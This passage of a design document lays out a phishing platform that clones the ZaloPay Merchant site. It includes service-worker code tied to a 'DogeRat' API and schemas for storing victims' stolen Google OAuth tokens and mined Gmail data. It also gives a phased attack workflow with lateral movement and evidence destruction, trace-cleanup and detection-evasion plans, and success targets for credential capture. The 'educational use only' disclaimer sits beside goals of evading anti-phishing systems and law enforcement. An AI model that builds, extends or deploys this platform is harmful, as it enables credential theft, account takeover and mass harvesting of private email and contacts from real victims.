    private backgroundSyncManager: BackgroundSyncManager | null = null;
    private pushManager: PushManager | null = null;

    async initializePWA(): Promise<void> {
        /** Initialize PWA features */
        
        // 1. Register Service Worker
        await this.registerServiceWorker();
        
        // 2. Set up Background Sync
        await this.setupBackgroundSync();
        
        // 3. Set up Push Notifications
        await this.setupPushNotifications();
        
        // 4. Set up Install Prompt
        this.setupInstallPrompt();
    }

    async registerServiceWorker(): Promise<void> {
        /** Register Service Worker cho background operations */
        
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js', {
                    scope: '/'
                });
                
                this.serviceWorkerRegistration = registration;
                
                // Handle service worker updates
                registration.addEventListener('updatefound', () => {
                    const newWorker = registration.installing;
                    if (newWorker) {
                        newWorker.addEventListener('statechange', () => {
                            if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                                // New service worker available
                                this.showUpdateNotification();
                            }
                        });
                    }
                });
                
            } catch (error) {
                console.error('Service Worker registration failed:', error);
            }
        }
    }

    async setupBackgroundSync(): Promise<void> {
        /** Set up Background Sync API cho background data sync */
        
        if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {
            const registration = await navigator.serviceWorker.ready;
            
            // Register background sync tags
            await registration.sync.register('sync-device-data');
            await registration.sync.register('sync-action-results');
            await registration.sync.register('sync-file-uploads');
            
            this.backgroundSyncManager = registration.sync;
        }
    }

    async syncDeviceDataInBackground(): Promise<void> {
        /** Sync device data khi app chạy nền */
        
        if (this.backgroundSyncManager) {
            await this.backgroundSyncManager.register('sync-device-data');
        }
    }

    async setupPushNotifications(): Promise<void> {
        /** Set up Push Notifications cho real-time alerts */
        
        if ('serviceWorker' in navigator && 'PushManager' in window) {
            const registration = await navigator.serviceWorker.ready;
            this.pushManager = registration.pushManager;
            
            // Request notification permission
            const permission = await Notification.requestPermission();
            
            if (permission === 'granted') {
                // Subscribe to push notifications
                const subscription = await this.pushManager.subscribe({
                    userVisibleOnly: true,
                    applicationServerKey: this.getVAPIDPublicKey()
                });
                
                // Send subscription to server
                await this.sendSubscriptionToServer(subscription);
            }
        }
    }

    setupInstallPrompt(): void {
        /** Set up PWA install prompt */
        
        let deferredPrompt: BeforeInstallPromptEvent | null = null;
        
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            this.showInstallButton();
        });
        
        // Handle install button click
        window.addEventListener('install-pwa', async () => {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                
                if (outcome === 'accepted') {
                    console.log('PWA installed successfully');
                    await this.onPWAInstalled();
                }
                
                deferredPrompt = null;
            }
        });
    }

    async onPWAInstalled(): Promise<void> {
        /** Handle PWA installation */
        
        // Cache essential assets
        await this.cacheEssentialAssets();
        
        // Set up background sync
        await this.setupBackgroundSync();
        
        // Enable background features
        await this.enableBackgroundFeatures();
    }
}
```

**Service Worker Implementation (`public/sw.js`):**
```javascript
// Service Worker for PWA background support
const CACHE_NAME = 'zalopay-merchant-v1';
const API_CACHE_NAME = 'zalopay-api-v1';

// Install event - Cache essential assets
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll([
                '/',
                '/index.html',
                '/manifest.json',
                '/icons/icon-192x192.png',
                '/icons/icon-512x512.png'
            ]);
        })
    );
});

// Fetch event - Network-first strategy for API, Cache-first for assets
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // API calls - Network-first strategy
    if (url.pathname.startsWith('/api/')) {
        event.respondWith(
            fetch(event.request)
                .then((response) => {
                    // Cache successful responses
                    if (response.ok) {
                        const responseClone = response.clone();
                        caches.open(API_CACHE_NAME).then((cache) => {
                            cache.put(event.request, responseClone);
                        });
                    }
                    return response;
                })
                .catch(() => {
                    // Fallback to cache if network fails
                    return caches.match(event.request);
                })
        );
    } else {
        // Static assets - Cache-first strategy
        event.respondWith(
            caches.match(event.request)
                .then((response) => {
                    return response || fetch(event.request);
                })
        );
    }
});

// Background Sync event - Sync device data
self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-device-data') {
        event.waitUntil(syncDevicesFromAPI());
    }
    
    if (event.tag === 'sync-action-results') {
        event.waitUntil(syncActionResultsFromAPI());
    }
    
    if (event.tag === 'sync-file-uploads') {
        event.waitUntil(syncFileUploadsFromAPI());
    }
});

// Push notification event
self.addEventListener('push', (event) => {
    const data = event.data.json();
    
    const options = {
        body: data.body,
        icon: '/icons/icon-192x192.png',
        badge: '/icons/badge-72x72.png',
        tag: data.tag,
        data: data.data
    };
    
    event.waitUntil(
        self.registration.showNotification(data.title, options)
    );
});

// Notification click event
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    
    event.waitUntil(
        clients.openWindow(event.notification.data.url || '/')
    );
});

// Helper functions
async function syncDevicesFromAPI() {
    try {
        const response = await fetch('/api/v1/devices');
        const devices = await response.json();
        
        // Store in IndexedDB for offline access
        await storeDevicesInIndexedDB(devices.data);
        
        // Broadcast to clients
        const clients = await self.clients.matchAll();
        clients.forEach((client) => {
            client.postMessage({
                type: 'devices-synced',
                data: devices.data
            });
        });
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}
```

**PWA Features:**
- **Web App Manifest**: App metadata, icons, shortcuts, display mode
- **Service Worker**: Background script cho offline support và background sync
- **Background Sync API**: Sync data khi app chạy nền
- **Push Notifications**: Real-time alerts khi có events
- **Cache API**: Offline support và performance optimization
- **Add to Home Screen**: Install PWA như native app
- **Offline Support**: App hoạt động offline với cached data
- **Background Operations**: DogeRat API calls hoạt động trong background

**Integration with DogeRat API:**
- Service Worker có thể gọi DogeRat API endpoints trong background
- Background sync device data từ DogeRat API
- Execute actions trong background
- Receive real-time updates via Socket.IO trong background
- URL của DogeRat API endpoints sử dụng cùng URL với web app

### Database Architecture & Schema Design

**Database Technology**: PostgreSQL (primary database với JSONB support), Connection Pooling (Prisma), In-memory caching (Express application-level)

**Core Collections Schema**:

#### Victims Collection
```javascript
{
  "_id": ObjectId("..."),
  "email": "ceo@techcorp.vn",
  "name": "Nguyễn Văn Nam",
  "password_hash": "$2b$12$encrypted_password_hash",
  "capture_date": ISODate("2025-10-04T15:30:25.000Z"),
  "validation": {
    "status": "validated",           // pending, validated, invalid
    "market_value": "high",          // low, medium, high
    "account_type": "business",      // personal, business, enterprise
    "validation_date": ISODate("2025-10-04T15:35:00.000Z"),
    "additional_data": {
      "gmail_labels": 147,
      "calendar_events": 89,
      "google_drive_files": 2341,
      "business_indicators": ["CEO", "Founder", "Executive"],
      "revenue_indicators": ["enterprise", "corporate", "limited"],
      "contact_quality_score": 0.92
    }
  },
  "session_data": {
    "ip_address": "192.168.1.100",
    "proxy_used": "socks5://vietnam-residential-01.proxy.com:1080",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "fingerprint": {
      "screen_resolution": "1920x1080",
      "timezone": "Asia/Ho_Chi_Minh",
      "language": "vi-VN,vi;q=0.9,en;q=0.8",
      "plugins": ["Chrome PDF Plugin", "Widevine CDM", "Native Client"],
      "canvas_signature": "a1b2c3d4e5f6...",
      "webgl_signature": "Intel Inc. HD Graphics 620",
      "audio_signature": "44100:2:f32"
    },
    "referrer": "https://www.google.com/search?q=zalopay+merchant",
    "utm_source": "google_ads",
    "campaign_attribution": "vietnamese_sme_q4_2025"
  },
  "campaign_id": ObjectId("campaign_zalopay_q4_2025"),
  "created_at": ISODate("2025-10-04T15:30:25.000Z"),
  "updated_at": ISODate("2025-10-04T15:40:15.000Z")
}
```

#### OAuth Tokens Collection
```javascript
{
  "_id": ObjectId("..."),
  "victim_id": ObjectId("victim_123"),
  "provider": "google",
  "tokens": {
    "access_token": "ya29.a0Aa4xrX1234567890abcdef...",  // AES encrypted
    "refresh_token": "1//0GX567890abcdef...",            // AES encrypted  
    "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",      // JWT token
    "expires_at": ISODate("2025-10-04T16:30:25.000Z"),
    "scope": [
      "openid",
      "email", 
      "profile",
      "https://www.googleapis.com/auth/gmail.readonly",
      "https://www.googleapis.com/auth/contacts.readonly",
      "https://www.googleapis.com/auth/calendar.readonly"
    ]
  },
  "token_metadata": {
    "issued_at": ISODate("2025-10-04T15:30:25.000Z"),
    "last_refresh": ISODate("2025-10-04T15:30:25.000Z"),
    "refresh_count": 0,
    "status": "active",  // active, expired, revoked, invalid
    "last_used": ISODate("2025-10-04T15:45:10.000Z")
  },
  "profile_data": {
    "google_id": "1234567890",
    "verified_email": true,
    "name": "Nguyễn Văn Nam",
    "given_name": "Nam",
    "family_name": "Nguyễn Văn",
    "picture": "https://lh3.googleusercontent.com/a/...",
    "locale": "vi"
  },
  "created_at": ISODate("2025-10-04T15:30:25.000Z"),
  "updated_at": ISODate("2025-10-04T15:30:25.000Z")
}
```

#### Gmail Access Logs Collection
```javascript
{
  "_id": ObjectId("..."),
  "admin_id": ObjectId("admin_user_001"),
  "victim_id": ObjectId("victim_123"),
  "access_session": {
    "session_id": "gmail_access_20251004_153025",
    "access_method": "oauth",         // oauth, session, direct
    "start_time": ISODate("2025-10-04T15:30:25.000Z"),
    "end_time": ISODate("2025-10-04T15:47:33.000Z"),
    "duration_seconds": 1028,
    "success": true
  },
  "actions_performed": {
    "emails_accessed": {
      "total_read": 89,
      "inbox_scanned": true,
      "sent_items_accessed": true,
      "search_queries": [
        "subject:contract",
        "from:bank",
        "subject:confidential"
      ],
      "valuable_emails_identified": 23,
      "attachments_downloaded": 7
    },
    "contacts_extracted": {
      "total_contacts": 1247,
      "business_contacts": 892,
      "personal_contacts": 355,
      "high_value_contacts": 67,
      "exported_formats": ["csv", "json"]
    },
    "additional_data": {
      "calendar_events_accessed": 45,
      "google_drive_files_listed": 234,
      "labels_analyzed": true,
      "filters_examined": true
    }
  },
  "operational_security": {
    "proxy_used": "socks5://admin-proxy-01.secure.com:1080",
    "admin_fingerprint": "admin_session_fingerprint_abc123",
    "ip_address": "10.0.0.100",
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "vpn_location": "Singapore",
    "traces_cleaned": true
  },
  "intelligence_gathered": {
    "business_intelligence": {
      "company_insights": 15,
      "financial_documents": 8,
      "contract_details": 12,
      "client_relationships": 89
    },
    "security_intelligence": {
      "password_patterns": 3,
      "other_accounts_discovered": 7,
      "security_practices_analyzed": true
    },
    "social_intelligence": {
      "personal_relationships": 156,
      "family_contacts": 23,
      "social_connections": 445
    }
  },
  "export_records": [
    {
      "export_type": "contacts_csv",
      "file_path": "/exports/contacts_ceo_techcorp_20251004.csv",
      "record_count": 1247,
      "export_time": ISODate("2025-10-04T15:45:00.000Z")
    },
    {
      "export_type": "valuable_emails_json",
      "file_path": "/exports/emails_ceo_techcorp_20251004.json",
      "record_count": 23,
      "export_time": ISODate("2025-10-04T15:46:30.000Z")
    }
  ],
  "created_at": ISODate("2025-10-04T15:30:25.000Z")
}
```


### Operational Workflows

#### End-to-End Attack Workflow

**Phase 1: Victim Acquisition & Initial Compromise**
```
1. Victim Navigation
   ├── Access phishing domain (zalopay-merchant.com)
   ├── Proxy assignment (Vietnam residential IP)
   ├── Device fingerprint generation
   └── Landing page presentation

2. Social Engineering
   ├── Present legitimate ZaloPay Merchant interface
   ├── Build trust with professional design
   ├── Incentivize authentication ("Exclusive merchant benefits")
   └── Multiple auth options (Google, Apple, manual)

3. Credential Capture
   ├── OAuth flow interception
   ├── Token extraction and storage
   ├── Session cookie harvesting
   └── Device fingerprinting data collection
```

**Phase 2: Credential Validation & Account Classification**
```
1. Automated Validation
   ├── OAuth token testing via Gmail API
   ├── Account type detection (personal vs business)
   ├── Data richness assessment
   └── Market value classification

2. Profile Enrichment  
   ├── Contact list extraction
   ├── Email pattern analysis
   ├── Business intelligence gathering
   └── Security posture assessment

3. Target Prioritization
   ├── High-value target identification
   ├── Administrative access detection
   ├── Multi-account correlation
   └── Campaign assignment
```

**Phase 3: Administrative Exploitation**
```
1. Admin Dashboard Access
   ├── Secure admin authentication (MFA)
   ├── Permission verification
   ├── OpSec session establishment
   └── Target selection interface

2. Gmail Access & Exploitation
   ├── OAuth-based Gmail authentication
   ├── Intelligent email mining
   ├── Contact relationship mapping
   └── Sensitive data extraction

3. Intelligence Analysis & Export
   ├── Business intelligence compilation
   ├── Security intelligence assessment
   ├── Relationship network analysis
   └── Actionable intelligence export
```

**Phase 4: Persistent Access & Advanced Exploitation**
```
1. Gmail Intelligence Extraction
   ├── Email content analysis
   ├── Contact relationship mapping
   ├── Business intelligence gathering
   └── Automated data export

2. Lateral Movement Preparation
   ├── Additional account discovery
   ├── Corporate network intelligence
   ├── Executive relationship mapping
   └── Next-phase target identification

3. Operational Security Maintenance
   ├── Activity log management
   ├── Trace elimination procedures
   ├── Proxy rotation and cleanup
   └── Evidence destruction protocols
```

### Security Architecture & OpSec Measures

#### Multi-Layer Security Architecture
```typescript
class OperationalSecurityFramework {
    private securityLayers: {
        admin_authentication: MultiFactorAuthentication;
        data_encryption: AES256Encryption;
        network_obfuscation: ProxyRotationManager;
        activity_monitoring: ComprehensiveAuditLogger;
        trace_elimination: AutoCleanupSystem;
    };

    constructor(prisma: PrismaClient) {
        this.securityLayers = {
            admin_authentication: new MultiFactorAuthentication(prisma),
            data_encryption: new AES256Encryption(),
            network_obfuscation: new ProxyRotationManager(prisma),
            activity_monitoring: new ComprehensiveAuditLogger(prisma),
            trace_elimination: new AutoCleanupSystem(prisma)
        };
    }

    async establishSecureAdminSession(adminCredentials: AdminCredentials): Promise<SecureWorkspace> {
        /** Establish secure admin session với full OpSec */
        
        // 1. Multi-factor authentication
        const mfaResult = await this.securityLayers.admin_authentication.verify(
            adminCredentials
        );
        if (!mfaResult.success) {
            throw new Error("MFA verification failed");
        }
        
        // 2. Secure session creation
        const sessionConfig: SessionConfig = {
            session_id: this.generateSecureSessionId(),
            admin_id: adminCredentials.user_id,
            proxy: await this.assignAdminProxy(),
            fingerprint: await this.generateAdminFingerprint(),
            encryption_key: this.generateSessionEncryptionKey(),
            audit_logger: this.createSessionAuditLogger()
        };
        
        // 3. Initialize secure workspace
        const secureWorkspace = await this.createIsolatedWorkspace(sessionConfig);
        
        return secureWorkspace;
    }

    async secureVictimDataAccess(adminSession: AdminSession, victimId: string, accessType: string): Promise<SecureConnection> {
        /** Secure access to victim data với comprehensive logging */
        
        // Verify admin permissions
        if (!await this.verifyAdminPermissions(adminSession.admin_id, accessType)) {
            throw new Error(`Insufficient permissions for ${accessType}`);
        }
        
        // Log access attempt
        await this.securityLayers.activity_monitoring.logAccessAttempt(
            adminSession.admin_id,
            victimId,
            accessType,
            adminSession.proxy.ip_address
        );
        
        // Establish secure connection
        const secureConnection = await this.createSecureConnection(
            adminSession.proxy,
            adminSession.encryption_key
        );
        
        return secureConnection;
    }

    async cleanupAdminSession(adminSession: AdminSession): Promise<void> {
        /** Comprehensive cleanup của admin session */
        
        const cleanupTasks = [
            this.clearBrowserData(adminSession),
            this.rotateProxyAssignment(adminSession),
            this.encryptSessionLogs(adminSession),
            this.scheduleLogDeletion(adminSession),
            this.updateAdminActivitySummary(adminSession)
        ];
        
        // Execute cleanup tasks concurrently
        await Promise.all(cleanupTasks);
        
        // Final session termination
        await this.terminateSession(adminSession.session_id);
    }
}
```

#### Data Protection & Encryption
```typescript
import * as crypto from 'crypto';

class DataProtectionSystem {
    private encryptionEngine: AES256GCM;
    private keyManagement: KeyManagementService;
    private dataClassification: DataClassificationEngine;

    constructor() {
        this.encryptionEngine = new AES256GCM();
        this.keyManagement = new KeyManagementService();
        this.dataClassification = new DataClassificationEngine();
    }

    async encryptSensitiveData(data: any, classification: string = 'HIGH_SENSITIVITY'): Promise<EncryptedRecord> {
        /** Encrypt sensitive data với appropriate protection level */
        
        // Generate unique encryption key per data record
        const encryptionKey = await this.keyManagement.generateDataKey(classification);
        
        // Encrypt data với authenticated encryption
        const plaintext = JSON.stringify(data);
        const encryptedData = this.encryptionEngine.encrypt(
            Buffer.from(plaintext, 'utf-8'),
            encryptionKey,
            this.generateAAD(classification)
        );
        
        // Store encrypted data với key reference
        const storageRecord: EncryptedRecord = {
            encrypted_payload: encryptedData.ciphertext.toString('base64'),
            nonce: encryptedData.nonce.toString('base64'),
            tag: encryptedData.tag.toString('base64'),
            key_id: encryptionKey.key_id,
            classification: classification,
            encrypted_at: new Date()
        };
        
        return storageRecord;
    }

    async decryptSensitiveData(encryptedRecord: EncryptedRecord, adminSession: AdminSession): Promise<any> {
        /** Decrypt sensitive data với access control verification */
        
        // Verify admin has permission to decrypt this classification level
        if (!await this.verifyDecryptionPermission(
            adminSession.admin_id, 
            encryptedRecord.classification
        )) {
            throw new Error("Insufficient permissions for data decryption");
        }
        
        // Retrieve decryption key
        const decryptionKey = await this.keyManagement.getDataKey(
            encryptedRecord.key_id
        );
        
        // Decrypt data
        const ciphertext = Buffer.from(encryptedRecord.encrypted_payload, 'base64');
        const nonce = Buffer.from(encryptedRecord.nonce, 'base64');
        const tag = Buffer.from(encryptedRecord.tag, 'base64');
        
        const decryptedData = this.encryptionEngine.decrypt(
            ciphertext,
            decryptionKey,
            nonce,
            tag,
            this.generateAAD(encryptedRecord.classification)
        );
        
        // Log decryption event
        await this.logDecryptionEvent(
            adminSession.admin_id,
            encryptedRecord.key_id,
            encryptedRecord.classification
        );
        
        return JSON.parse(decryptedData.toString('utf-8'));
    }
}
```

## Implementation Roadmap

### Phase 1: Foundation Infrastructure (Weeks 1-3)
**Core System Setup**
- PostgreSQL database setup và schema creation (Replit PostgreSQL)
- Express.js application structure và Prisma connection pooling
- Replit environment configuration
- Basic admin authentication system
- Proxy pool management infrastructure

**Key Deliverables**:
```bash
# Infrastructure Components
├── .replit                          # Replit configuration
├── prisma/                          # Prisma schema và migrations
├── src/                            # Express.js application structure
│   ├── app.ts                      # Express app setup
│   ├── routes/                     # API routes
│   ├── services/                   # Business logic
│   └── utils/                      # Utilities
├── proxy-manager/                 # SOCKS5 proxy management
├── admin-auth/                    # Admin authentication service
└── monitoring/                    # Basic monitoring setup
```

### Phase 2: Frontend & Capture Engine (Weeks 4-6)
**Victim-Facing Interface Development**
- ZaloPay Merchant UI cloning và optimization
- OAuth integration (Google, Apple) với capture capability
- Device fingerprinting engine implementation
- Initial credential capture và storage system
- PostgreSQL database integration

**Key Deliverables**:
```bash
# Frontend Components
├── frontend/
│   ├── templates/                 # ZaloPay UI templates
│   ├── static/                   # CSS, JS, images
│   ├── oauth/                    # OAuth capture modules
│   └── fingerprinting/           # Device fingerprinting
└── capture-engine/               # Credential processing
```

### Phase 3: Admin Dashboard & Management (Weeks 7-9)  
**Administrative Interface Development**
- Comprehensive admin dashboard với real-time updates
- Victim management interface với advanced filtering
- Campaign creation và monitoring system
- Content management system (FAQ, Guides)
- Activity logging và audit trail system

**Key Deliverables**:
```bash
# Admin Interface
├── admin-dashboard/
│   ├── templates/                # Admin UI templates
│   ├── api/                     # Backend API endpoints
│   ├── websocket/               # Real-time updates
│   └── permissions/             # Role-based access control
├── campaign-manager/            # Campaign management
└── audit-system/               # Activity logging
```

### Phase 4: Gmail Exploitation Module (Weeks 10-12)
**Advanced Gmail Access & Data Mining**
- OAuth-based Gmail API integration
- Intelligent email mining và content analysis
- Contact extraction và relationship mapping
- Data export capabilities với multiple formats
- Operational security measures for admin access

**Key Deliverables**:
```bash
# Gmail Exploitation
├── gmail-access/
│   ├── oauth-manager/           # OAuth token management
│   ├── email-mining/            # Email analysis engine
│   ├── contact-extraction/      # Contact relationship mapping
│   └── data-export/             # Export functionality
├── intelligence-analysis/       # Data analysis engine
└── opsec-framework/            # Operational security
```

### Phase 5: Advanced Features & Production Hardening (Weeks 13-15)
**Advanced Capabilities & Security Hardening**
- Advanced Gmail exploitation workflows
- Automated intelligence analysis và reporting
- Production-ready security measures
- Performance optimization và scaling
- Comprehensive testing và QA

**Key Deliverables**:
```bash
# Production System
├── gmail-exploitation/          # Advanced Gmail access và extraction
├── intelligence-engine/         # Automated analysis
├── security-hardening/          # Production security measures
├── performance-optimization/    # Scaling và optimization
└── testing-framework/          # Comprehensive testing
```

## Technical Specifications

### Hardware Requirements
**Minimum System Requirements**:
- **CPU**: 8 cores (16 threads recommended)
- **Memory**: 32GB RAM (64GB recommended for production)
- **Storage**: 1TB NVMe SSD (2TB recommended)
- **Network**: Gigabit internet với unlimited bandwidth
- **Geographic Distribution**: Multi-region deployment capability

**Recommended Production Architecture**:
```yaml
# Production Deployment Architecture
Load_Balancer:
  - Nginx (HA-Proxy backup)
  - SSL Termination (Let's Encrypt + Wildcard)
  - DDoS Protection (CloudFlare)

Application_Server:
  - Express.js application (Single server on Replit)
  - Connection pooling (Prisma)
  - Health checks và monitoring

Database:  
  - PostgreSQL (Replit managed database)
  - Automated backups (Replit built-in)
  - Connection pooling for performance (Prisma)

Caching:
  - In-memory caching (Express application-level)
  - Session storage (PostgreSQL with JSONB)
  - Real-time data caching (application memory)

Proxy_Infrastructure:
  - 50+ SOCKS5 proxies (Vietnam residential)
  - 20+ Mobile proxies (carrier diversity)
  - 30+ Datacenter proxies (global backup)
  - Health monitoring và auto-rotation
```

### Software Dependencies
**Core Technology Stack**:
```yaml
Backend:
  - Node.js 18+ (Express.js, TypeScript)
  - PostgreSQL 15+ (Primary database via Replit)
  - Prisma (PostgreSQL ORM with connection pooling)
  - Socket.io (Real-time components)

Frontend:
  - HTML5, CSS3 (Modern standards)
  - JavaScript ES2022+ (Modern syntax)
  - Bootstrap 5.3+ (UI framework)
  - Chart.js 4.0+ (Analytics visualization)

Security:
  - Node.js crypto module (Encryption)
  - JWT (Authentication tokens)
  - bcrypt (Password hashing)
  - AES-256-GCM (Data encryption via crypto module)

Integration:
  - googleapis (Gmail access)
  - Prisma (PostgreSQL ORM)
  - Socket.io (Real-time updates)
  - Replit PostgreSQL (Database service)
```

### Network & Security Configuration
**Firewall Rules**:
```bash
# Inbound Rules
443/tcp    ALLOW   0.0.0.0/0          # HTTPS (Public)
80/tcp     ALLOW   0.0.0.0/0          # HTTP (Redirect to HTTPS)
22/tcp     ALLOW   ADMIN_IPS          # SSH (Admin access only)
8000/tcp   ALLOW   ADMIN_IPS          # Admin Dashboard
5432/tcp   ALLOW   127.0.0.1          # PostgreSQL (Internal only)

# Outbound Rules
443/tcp    ALLOW   0.0.0.0/0          # HTTPS (OAuth providers)
80/tcp     ALLOW   0.0.0.0/0          # HTTP (Updates)
53/tcp     ALLOW   0.0.0.0/0          # DNS
1080/tcp   ALLOW   PROXY_POOL         # SOCKS5 Proxies
```

**SSL/TLS Configuration**:
```nginx
# Nginx SSL Configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
ssl_stapling on;
ssl_stapling_verify on;
```

## Risk Assessment & Mitigation

### Operational Risks
**High-Risk Scenarios**:
1. **Law Enforcement Detection**: Platform discovery by cybersecurity authorities
2. **Provider Takedown**: Domain/hosting provider suspension
3. **Technical Detection**: Anti-phishing systems identifying platform
4. **Data Breach**: Compromise of captured victim data
5. **Admin Compromise**: Administrative access breach

**Mitigation Strategies**:
```typescript
class RiskMitigationFramework {
    private riskMonitors: string[];

    constructor() {
        this.riskMonitors = [
            'law_enforcement_detection',
            'provider_monitoring', 
            'technical_detection',
            'data_security',
            'admin_security'
        ];
    }

    async implementRiskControls(): Promise<SecurityControls> {
        /** Comprehensive risk mitigation implementation */
        
        const controls: SecurityControls = {
            operational_security: [
                'geographic_distribution',
                'infrastructure_rotation',
                'identity_compartmentalization',
                'communication_encryption'
            ],
            technical_security: [
                'advanced_obfuscation',
                'detection_evasion',
                'data_encryption',
                'access_controls'
            ],
            administrative_security: [
                'admin_mfa_enforcement',
                'session_monitoring',
                'privilege_segregation',
                'audit_trail_integrity'
            ]
        };
        
        return await this.deploySecurityControls(controls);
    }
}
```

### Legal & Ethical Considerations
**Educational Use Only**: Platform intended exclusively for cybersecurity education và authorized security testing
**Explicit Authorization Required**: All deployment must have explicit written authorization from target organizations
**Data Protection Compliance**: Implement GDPR-compliant data handling procedures
**Responsible Disclosure**: Coordinate với security researchers for responsible vulnerability disclosure

## Success Metrics & KPIs

### Technical Performance Metrics
```yaml
System_Performance:
  - Response Time: <2 seconds (95th percentile)
  - Uptime: >99.5% availability  
  - Throughput: >1000 concurrent users
  - Database Performance: <100ms query response

Security_Metrics:
  - Detection Rate: <5% by anti-phishing systems
  - Proxy Success Rate: >95% connection success
  - Data Encryption: 100% sensitive data encrypted
  - Access Control: 0 unauthorized access incidents

Operational_Metrics:
  - Credential Capture Rate: >70% visitor conversion
  - Validation Success Rate: >85% captured credentials valid
  - High-Value Target Identification: >20% business accounts
  - Intelligence Quality Score: >0.8 average quality rating
```

### Educational Impact Assessment
```typescript
class EducationalImpactMetrics {
    private learningObjectives: string[];

    constructor() {
        this.learningObjectives = [
            'phishing_technique_understanding',
            'social_engineering_awareness', 
            'technical_countermeasure_development',
            'operational_security_principles',
            'ethical_hacking_methodology'
        ];
    }

    measureEducationalImpact(): EducationalImpact {
        return {
            security_professionals_trained: this.countTrainedProfessionals(),
            vulnerabilities_discovered: this.countDiscoveredVulnerabilities(),
            countermeasures_developed: this.countDevelopedCountermeasures(),
            awareness_campaigns_launched: this.countAwarenessCampaigns(),
            industry_improvements: this.measureIndustrySecurityImprovements()
        };
    }
}
```

## Conclusion & Future Enhancements

### Platform Value Proposition
**ZaloPay Merchant Advanced Phishing Platform** represents a comprehensive, state-of-the-art cybersecurity research environment that combines realistic attack simulation với advanced administrative capabilities. The platform provides unprecedented insight into modern phishing operations while maintaining strict ethical boundaries for educational use.

### Future Enhancement Roadmap
**Q1 2026 Enhancements**:
- **AI-Powered Social Engineering**: ChatGPT integration for personalized victim communication
- **Multi-Platform Expansion**: Extension to mobile apps và additional financial platforms
- **Advanced Analytics**: Machine learning-powered victim behavior analysis
- **Automated Reporting**: AI-generated intelligence reports và threat assessments

**Q2 2026 Advanced Features**:
- **Distributed Architecture**: Multi-region deployment với advanced load balancing
- **Blockchain Integration**: Cryptocurrency-focused phishing campaign capabilities  
- **Voice Engineering**: VoIP-based social engineering integration
- **Deepfake Technology**: AI-generated audio/video for enhanced social engineering

### Research Contributions
This platform contributes to cybersecurity research by:
1. **Advancing Detection Techniques**: Providing realistic attack vectors for detection system development
2. **Improving User Awareness**: Demonstrating sophisticated attack methodologies for educational purposes
3. **Enhancing Countermeasures**: Enabling development of advanced anti-phishing technologies
4. **Professional Development**: Training cybersecurity professionals in modern threat landscapes

### Ethical Framework
All platform development và deployment must adhere to strict ethical guidelines:
- **Authorization Requirement**: Explicit written consent for all testing
- **Educational Purpose**: Platform use limited to legitimate cybersecurity education
- **Data Protection**: Comprehensive data protection và privacy measures
- **Responsible Disclosure**: Coordinated vulnerability disclosure processes
- **Legal Compliance**: Full compliance với applicable cybersecurity laws và regulations

---

**Document Classification**: Educational Research - Controlled Access
**Version**: 1.0.0 Comprehensive
**Last Updated**: October 5, 2025
**Review Cycle**: Monthly security và content updates
**Access Level**: Authorized Cybersecurity Professionals Only